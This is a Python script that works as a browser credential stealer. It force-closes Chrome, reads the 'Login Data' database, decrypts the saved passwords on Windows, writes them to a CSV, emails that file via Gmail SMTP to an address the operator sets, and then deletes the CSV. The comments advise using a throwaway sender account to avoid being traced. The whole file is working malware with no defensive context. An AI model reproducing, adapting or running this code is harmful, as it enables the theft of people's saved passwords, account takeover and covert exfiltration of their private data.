import os
import sys
import sqlite3
import csv
import argparse
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

try:
    import win32crypt
except:
    pass

email_user = '' #Enter a fake email that will be sending out the code
email_user_pass = '' #Enter password from a fake email
email_send = '' #Enter email that will receive the email (You should not put your personal email here)
Subject = ''
content = ''
filename ='TEMP'+'.csv'

def args_parser():
        os.system("TASKKILL /F /IM chrome.exe") #Kills Chrome so that extraction of passwords is possible
        output_csv(main())
        os.remove(filename) #removes csv file
        return

def main():
    info_list = []
    path = getpath()
    try:
        connection = sqlite3.connect(path + "Login Data")
        with connection:
            cursor = connection.cursor()
            v = cursor.execute(
                'SELECT action_url, username_value, password_value FROM logins')
            value = v.fetchall()

        if (os.name == "posix") and (sys.platform == "darwin"):
            print("Mac OSX not supported.")
            sys.exit(0)

        for information in value:
            if os.name == 'nt':
                password = win32crypt.CryptUnprotectData(
                    information[2], None, None, None, 0)[1]
                if password:
                    info_list.append({
                        'origin_url': information[0],
                        'username': information[1],
                        'password': str(password)
                    })

            elif os.name == 'posix':
                info_list.append({
                    'origin_url': information[0],
                    'username': information[1],
                    'password': information[2]
                })

    except sqlite3.OperationalError as e:
        e = str(e)
        if (e == 'database is locked'):
            print('[!] Make sure Google Chrome is not running in the background')
            sys.exit(0)
        elif (e == 'no such table: logins'):
            print('[!] Something wrong with the database name')
            sys.exit(0)
        elif (e == 'unable to open database file'):
            print('[!] Something wrong with the database path')
            sys.exit(0)
        else:
            print(e)
            sys.exit(0)

    return info_list


def getpath():
    if os.name == "nt":
        # This is the Windows Path
        PathName = os.getenv('localappdata') + \
            '\\Google\\Chrome\\User Data\\Default\\'
        if (os.path.isdir(PathName) == False):
            print('[!] Chrome Doesn\'t exists')
            sys.exit(0)
    elif ((os.name == "posix") and (sys.platform == "darwin")):
        # This is the OS X Path
        PathName = os.getenv(
            'HOME') + "/Library/Application Support/Google/Chrome/Default/"
        if (os.path.isdir(PathName) == False):
            print('[!] Chrome Doesn\'t exists')
            sys.exit(0)
    elif (os.name == "posix"):
        # This is the Linux Path
        PathName = os.getenv('HOME') + '/.config/google-chrome/Default/'
        if (os.path.isdir(PathName) == False):
            print('[!] Chrome Doesn\'t exists')
            sys.exit(0)

    return PathName


def output_csv(info):
    try:
        with open(filename, 'wb') as csv_file:
            csv_file.write('origin_url,username,password \n'.encode('utf-8'))
            for data in info:
                csv_file.write(('%s, %s, %s \n' % (data['origin_url'], data[
                    'username'], data['password'])).encode('utf-8'))
        msg = MIMEMultipart()
        msg['From'] = email_user
        msg['To'] = email_send
        msg['Subject'] = Subject

        msg.attach(MIMEText(content,'plain'))
        filename
        attachment = open(filename,'rb')
        part = MIMEBase('application','octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', "attachment; filename="+filename)
        msg.attach(part)
        text = msg.as_string()
        mail = smtplib.SMTP('smtp.gmail.com',587)
        mail.ehlo()
        mail.starttls()
        mail.login(email_user, email_user_pass)
        mail.sendmail(email_user,email_send, text)
        mail.close
    except EnvironmentError:
        print('EnvironmentError: cannot write data')

if __name__ == '__main__':
    args_parser()
